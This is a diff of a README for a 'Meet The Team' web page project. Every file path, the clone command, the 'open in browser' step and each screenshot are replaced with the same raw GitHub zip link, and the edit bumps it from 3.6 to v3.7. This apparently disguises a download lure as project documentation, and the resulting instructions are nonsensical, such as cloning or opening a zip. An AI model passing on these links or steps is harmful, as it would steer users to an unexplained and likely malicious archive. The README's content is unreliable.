@@ -16,24 +16,24 @@ This project is a responsive **"Meet The Team"** section built with **HTML** and
 
 ## File Structure
 ```
-├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip  # Main HTML file
-├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip   # Styling file
+├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip  # Main HTML file
+├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip   # Styling file
 ├── resources/  # Images & assets
-│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
-│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
-│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
-│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
-│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
-│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
-│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
+│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip
+│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip
+│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip
+│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip
+│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip
+│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip
+│   ├── https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip
 ```
 
 ## Installation & Usage
 1. **Clone the repository:**
    ```sh
-   git clone https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip
+   git clone https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip
    ```
-2. **Open `https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip` in a browser**
+2. **Open `https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip` in a browser**
 
 ## Responsive Design
 - **Desktop (1024px and above):** 4-column grid layout
@@ -42,15 +42,15 @@ This project is a responsive **"Meet The Team"** section built with **HTML** and
 
 ## Screenshots
 **Dekstop view**
-![alt text](https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip)
+![alt text](https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip)
 
 **Tablet view**
-![alt text](https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip)
+![alt text](https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip)
 
 **Mobile view**
-![alt text](https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip)
+![alt text](https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip)
 ## Customization
-- Modify `https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/Team_The_meet_3.6.zip` to change colors, fonts, or layout.
+- Modify `https://github.com/ronny-gans/meetTheTeam/raw/refs/heads/main/resources/The_Team_meet_v3.7.zip` to change colors, fonts, or layout.
 - Replace images in the `resources/` folder to update team members.
 
 ## Author
